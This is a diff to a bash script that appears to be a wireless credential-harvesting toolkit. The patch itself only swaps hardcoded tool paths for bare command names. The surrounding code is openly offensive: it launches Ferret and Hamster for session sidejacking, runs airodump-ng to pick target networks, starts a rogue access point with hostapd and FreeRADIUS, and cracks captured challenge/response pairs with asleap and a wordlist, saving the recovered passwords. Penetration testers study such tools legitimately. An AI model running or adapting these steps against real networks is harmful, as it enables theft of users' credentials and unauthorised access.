@@ -263,11 +263,11 @@ f_aircrackupdate(){
 	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
 	sleep 2
 	echo -e "\e[1;33m[*] Updating airodump-ng OUI.\e[0m\n"
-	bash $airodumppath/airodump-ng-oui-update > /dev/null
+	bash airodump-ng-oui-update > /dev/null
 	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
 	sleep 3
 
-	cd $location
+	cd ${location}
 	f_prereqs
 }
 
@@ -515,7 +515,7 @@ f_ICMPPoison(){
 f_sidejack(){
 	echo -e "\n\e[1;33m[*] Starting Hamster & Ferret...\e[0m\n"
 	cd ${logfldr}
-	screen -dmS SideJack -t ferret bash -c "${ferretpath}/ferret -i ${IFACE}"
+	screen -dmS SideJack -t ferret bash -c "ferret -i ${IFACE}"
 	sleep 2
 	screen -S SideJack -t hamster -X screen ${hamsterpath}/hamster
 	cd ${location}
@@ -1023,9 +1023,9 @@ f_getbssids(){
 	echo -e "\n\e[1;33m[*] Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m\n"
 
 	if [ -z ${isxrunning} ]; then
-		screen -S easy-creds -t Airodump -X screen ${airodumppath}/airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv
+		screen -S easy-creds -t Airodump -X screen airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv
 	else
-		xterm -geometry 90x25+0+0 -T "Airodump" -e ${airodumppath}/airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv &
+		xterm -geometry 90x25+0+0 -T "Airodump" -e airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv &
 	fi
 	echo $! > /tmp/ec/airodump-pid
 	#wait for the process to die
@@ -1373,7 +1373,7 @@ f_freeradiusfinal(){
 	 echo $! > /tmp/ec/freeradius.pid
 	 sleep 3
 	else
-	 screen -dmS FreeRadius -t radiusd ${pathtoradiusd}/radiusd -X -f
+	 screen -dmS FreeRadius -t radiusd radiusd -X -f
 	 echo $! > /tmp/ec/freeradius.pid
 	fi
 
@@ -1382,10 +1382,10 @@ f_freeradiusfinal(){
 
 	if [ ! -z ${isxrunning} ]; then
 	 y=$((${y}+${yoffset}))
-	 xterm -geometry "${width}"x${height}-${x}+${y} -T "hostapd" -bg black -fg white -e ${pathtohostapd}/hostapd /tmp/ec/ec-hostapd.conf &
+	 xterm -geometry "${width}"x${height}-${x}+${y} -T "hostapd" -bg black -fg white -e hostapd /tmp/ec/ec-hostapd.conf &
 	 sleep 3
 	else
-	 screen -S FreeRadius -t hostapd -X screen ${pathtohostapd}/hostapd /tmp/ec/ec-hostapd.conf
+	 screen -S FreeRadius -t hostapd -X screen hostapd /tmp/ec/ec-hostapd.conf
 	 echo $! > /tmp/ec/hostapd.pid
 	fi
 
@@ -1546,7 +1546,7 @@ while [ $i -le "${NUMLINES}" ]; do
 	response=$(awk NR==${i} /tmp/ec/freeradius-creds.tmp|tr -d '\r')
 	i=$[${i}+1]
 	echo "Username: ${username}" >> "${acreds}"
-	${asleappath}/asleap -C ${challenge} -R ${response} -W ${wordlist} | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g' >> "${acreds}"
+	asleap -C ${challenge} -R ${response} -W ${wordlist} | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g' >> "${acreds}"
 	echo >> ${acreds}
 done
 
